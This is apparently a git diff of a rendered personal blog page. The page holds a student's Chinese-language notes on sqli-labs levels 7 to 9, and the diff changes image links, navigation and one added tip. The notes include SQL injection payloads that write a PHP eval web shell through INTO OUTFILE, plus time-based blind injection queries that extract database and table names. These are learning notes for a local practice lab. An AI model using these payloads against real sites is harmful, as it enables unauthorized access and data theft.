@@ -100,12 +100,12 @@ Yume Shoka = 暮间的花园</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexbei4hj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
         </ul>
       </div>
     </header>
@@ -171,7 +171,7 @@ Yume Shoka = 暮间的花园</title>
 <h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a><strong>less-7</strong></h2><p>经过一番努力终于弄好了，第一步是检测闭合方式，接连试了单引号双引号括号以及混合方式统统闭合不成功！一看教程，单引号加两个括号。。。总之努力过了，接下来按照教程说的要用上传文件的语法<br><code>into outfile &quot;绝对路径（本地的反斜杠要写两个）&quot;</code><br>然后写shell，但是写了之后写不进去，百度搜索是没有允许写入，要在命令行使用命令：<br><code>show variables like &quot;secure_file_priv&quot;;</code><br>就能查看<code>secure_file_priv</code>的值，如果是<code>null</code>就说明禁止写入，所以打开mysql安装目录，在my.ini这个配置文件中写入<code>secure_file_priv = &#39;&#39;</code>，然后保存，关闭，然后重启mysql，然后就可以在命令行mysql再次查看，这次那一栏变成空的了，然后在本地写入shell，<code>union select 1,2,&quot;&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;&quot; into outfile &quot;绝对路径&quot;</code>，然后就能用蚁剑连上了。  </p>
 <hr>
 <p>（2021.4.19）</p>
-<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a><strong>less-8</strong></h2><p>因为无论如何也没有回显，所以需要时间盲注（暂时不会其他方式），输入<code>?id=1&#39; and if(length(dadabase())&gt;7,sleep(3),1)--+</code>,成功睡了3秒后，再尝试=8，此时也成功睡了3秒，得出结论当前数据库长度为8<br>接下来开始爆数据库名<code>?id=1&#39; and if((ascii(substr(database(),1,1)=96),sleep(10),1)--+</code>,然后用集束炸弹对截取位置和ascii码进行爆破，对长度排序，得到八个长度比别的数据大10的数据，根据第一个数值排序，对第二个数值一一进行ascii转码就能得到当前数据库名。<br><code>payload：?id=1&#39; and if((select length(group_concat(schema_name)) from information_schema.schemata)=70,sleep(3),1)--+</code><br>利用bp爆破得到所以数据库总长度,判断完长度就能直接爆了，然后一边判断长度一边爆，用于表名可能出现的最多的是字母，所以就先爆出字母内容，然后对没爆出的位置对照下划线和逗号进行爆，也可以写好26字母加上下划线和逗号的字典直接把字段内容爆出来（大概=&gt;确实）刚刚试了，可以直接用简单清单，将26字母加下划线和逗号写入，然后就能爆出<br><code>?id=1&#39;and if((select substr(group_concat(table_name),（爆破位置）,1)from information_schema.tables where table_schema=&#39;muhua_io&#39;)=&#39;（对照内容）&#39;,sleep(3),1)--+</code><br>之后应该都是一样的了，缺点是如果爆破内容太长就会很难连缀爆出的内容，因为筛选长度内容排序后就无法对前面爆破内容排序了，需要人工排序，总之按老规矩爆出了我的QQ号<br>（附：试了下别人写的爆当前库的脚本，并且合理修改，稳定爆出了所有内容，之后要好好学写脚本啊，像是高级版bp，但因为是bool型盲注，根据页面是否返回You are in来判断的，所以无法应用于9,10题）。<br>（2021.4.20）  </p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a><strong>less-8</strong></h2><p>因为无论如何也没有回显，所以需要时间盲注（暂时不会其他方式），输入<code>?id=1&#39; and if(length(dadabase())&gt;7,sleep(3),1)--+</code>,成功睡了3秒后，再尝试=8，此时也成功睡了3秒，得出结论当前数据库长度为8<br>接下来开始爆数据库名<code>?id=1&#39; and if((ascii(substr(database(),1,1)=96),sleep(10),1)--+</code>,然后用集束炸弹对截取位置和ascii码进行爆破，对长度排序，得到八个长度比别的数据大10的数据，根据第一个数值排序，对第二个数值一一进行ascii转码就能得到当前数据库名。<br><code>payload：?id=1&#39; and if((select length(group_concat(schema_name)) from information_schema.schemata)=70,sleep(3),1)--+</code><br><img data-src="https://xiquanmuhua.github.io/images/62]VQ4VO7V~Q6I~_MP0IOI2.png" alt="result"><br>利用bp爆破得到所以数据库总长度,判断完长度就能直接爆了，然后一边判断长度一边爆，用于表名可能出现的最多的是字母，所以就先爆出字母内容，然后对没爆出的位置对照下划线和逗号进行爆，也可以写好26字母加上下划线和逗号的字典直接把字段内容爆出来（大概=&gt;确实）刚刚试了，可以直接用简单清单，将26字母加下划线和逗号写入，然后就能爆出<br><code>?id=1&#39;and if((select substr(group_concat(table_name),（爆破位置）,1)from information_schema.tables where table_schema=&#39;muhua_io&#39;)=&#39;（对照内容）&#39;,sleep(3),1)--+</code><br>之后应该都是一样的了，缺点是如果爆破内容太长就会很难连缀爆出的内容，因为筛选长度内容排序后就无法对前面爆破内容排序了，需要人工排序，总之按老规矩爆出了我的QQ号<br>（附：试了下别人写的爆当前库的脚本，并且合理修改，稳定爆出了所有内容，之后要好好学写脚本啊，像是高级版bp，但因为是bool型盲注，根据页面是否返回You are in来判断的，所以无法应用于9,10题）。<br>bp中构造payload不能有空格，可以用空格的url码%20代替。<br>（2021.4.20）  </p>
 <hr>
 <h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a><strong>less-9</strong></h2><p>第八关虽然无论如何都没有输入回显，但会有输入正常与否的区别，第九关无论怎么输入都是同一个界面，但通过sleep函数检测，是单引号闭合的，时间盲注，办法同上一关。  </p>
 <hr>
@@ -206,7 +206,7 @@ Yume Shoka = 暮间的花园</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2021-04-24 11:58:40" itemprop="dateModified" datetime="2021-04-24T11:58:40+08:00">2021-04-24</time>
+    <time title="Modified: 2021-04-24 13:22:57" itemprop="dateModified" datetime="2021-04-24T13:22:57+08:00">2021-04-24</time>
   </span>
 </div>
 
@@ -261,7 +261,7 @@ Yume Shoka = 暮间的花园</title>
     <div class="item left">
       
 
-  <a href="/2021/03/28/%E5%82%BB%E7%93%9Cmuhua%E5%86%99xctf%E7%9A%84web%E6%96%B0%E6%89%8B%E5%9C%BA%E9%A2%98%E8%A7%A3/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciszlczyj20zk0m816d.jpg" title="傻瓜muhua写xctf的web新手场题解">
+  <a href="/2021/03/28/%E5%82%BB%E7%93%9Cmuhua%E5%86%99xctf%E7%9A%84web%E6%96%B0%E6%89%8B%E5%9C%BA%E9%A2%98%E8%A7%A3/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclip4jbpj20zk0m87cv.jpg" title="傻瓜muhua写xctf的web新手场题解">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>傻瓜muhua写xctf的web新手场题解</h3>
@@ -358,7 +358,7 @@ Yume Shoka = 暮间的花园</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2021/03/28/%E5%82%BB%E7%93%9Cmuhua%E5%86%99xctf%E7%9A%84web%E6%96%B0%E6%89%8B%E5%9C%BA%E9%A2%98%E8%A7%A3/" title="傻瓜muhua写xctf的web新手场题解">傻瓜muhua写xctf的web新手场题解</a></span>
+    <span><a href="/2020/12/14/ctf%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86%E4%B8%8E%E5%BF%83%E5%BE%97/" title="ctf学习经历与心得">ctf学习经历与心得</a></span>
   </li>
 
       
@@ -367,7 +367,7 @@ Yume Shoka = 暮间的花园</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2020/12/14/ctf%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86%E4%B8%8E%E5%BF%83%E5%BE%97/" title="ctf学习经历与心得">ctf学习经历与心得</a></span>
+    <span><a href="/2021/03/28/%E5%82%BB%E7%93%9Cmuhua%E5%86%99xctf%E7%9A%84web%E6%96%B0%E6%89%8B%E5%9C%BA%E9%A2%98%E8%A7%A3/" title="傻瓜muhua写xctf的web新手场题解">傻瓜muhua写xctf的web新手场题解</a></span>
   </li>
 
       
